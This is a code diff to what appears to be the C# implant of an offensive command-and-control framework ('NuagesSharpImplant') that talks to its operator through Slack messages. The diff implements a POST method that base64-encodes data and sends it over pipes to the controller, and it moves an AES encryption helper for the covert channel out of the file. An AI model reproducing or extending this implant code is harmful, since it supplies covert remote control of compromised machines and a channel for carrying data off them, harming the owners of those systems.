@@ -1,12 +1,12 @@
 using System;
 using System.IO;
 using System.Net;
-using System.Security.Cryptography;
 using System.Text;
 using System.Json;
 using System.Collections.Generic;
+using NuagesSharpImplant.Utils;
 
-namespace NuagesSharpImplant
+namespace NuagesSharpImplant.Connections
 {
     
 
@@ -150,9 +150,16 @@ namespace NuagesSharpImplant
             return messages[1]["text"].ToString();
         }
 
-        public byte[] POST(string url, byte[] body)
+        public byte[] POST(string url, byte[] input)
         {
-            return new byte[0];
+            string[] temp = url.Split('/');
+            List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
+            list.Add(new KeyValuePair<string, JsonValue>("pipe_id", temp[1]));
+            list.Add(new KeyValuePair<string, JsonValue>("maxSize", temp[2]));
+            list.Add(new KeyValuePair<string, JsonValue>("in", Convert.ToBase64String(input)));
+            JsonObject body = new JsonObject(list);
+            JsonValue response = JsonValue.Parse(POST("io", body.ToString()));
+            return Convert.FromBase64String(response["out"]);
         }
 
         public string POST(string url, string jsonContent)
@@ -169,83 +176,6 @@ namespace NuagesSharpImplant
             System.Threading.Thread.Sleep(1000);
             string nResponse = this.getSlackResponse(ts);
             return this.aes.DecryptString(Convert.FromBase64String(nResponse));
-        }
-        class AESHelper
-        {
-            byte[] key;
-
-            static byte[] Sha256(string rawData)
-            {
-                using (SHA256 sha256Hash = SHA256.Create())
-                {
-                    return sha256Hash.ComputeHash(Encoding.UTF8.GetBytes(rawData));
-
-                }
-            }
-
-            public AESHelper(string password)
-            {
-
-                this.key = Sha256(password);
-
-            }
-
-            public byte[] EncryptString(string message)
-            {
-                byte[] encrypted;
-                using (Rijndael rijAlg = Rijndael.Create())
-                {
-                    rijAlg.Key = key;
-                    rijAlg.GenerateIV();
-                    rijAlg.Mode = CipherMode.CBC;
-                    rijAlg.Padding = PaddingMode.PKCS7;
-                    byte[] iv = rijAlg.IV;
-                    ICryptoTransform encryptor = rijAlg.CreateEncryptor(rijAlg.Key, rijAlg.IV);
-                    using (MemoryStream msEncrypt = new MemoryStream())
-                    {
-                        msEncrypt.Write(iv, 0, iv.Length);
-                        using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
-                        {
-                            using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
-                            {
-                                swEncrypt.Write(message);
-                                swEncrypt.Flush();
-                            }
-                            encrypted = msEncrypt.ToArray();
-                        }
-                    }
-                }
-                return encrypted;
-            }
-
-
-            public string DecryptString(byte[] bytes)
-            {
-                string plaintext = null;
-                using (Rijndael rijAlg = Rijndael.Create())
-                {
-                    rijAlg.Key = key;
-                    rijAlg.Mode = CipherMode.CBC;
-                    rijAlg.Padding = PaddingMode.PKCS7;
-
-                    using (MemoryStream msDecrypt = new MemoryStream(bytes))
-                    {
-                        var iv = new byte[16];
-                        msDecrypt.Read(iv, 0, 16);
-                        rijAlg.IV = iv;
-                        ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);
-
-                        using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
-                        {
-                            using (StreamReader srDecrypt = new StreamReader(csDecrypt))
-                            {
-                                plaintext = srDecrypt.ReadToEnd();
-                            }
-                        }
-                    }
-                }
-                return plaintext;
-            }
         }
     }
 }
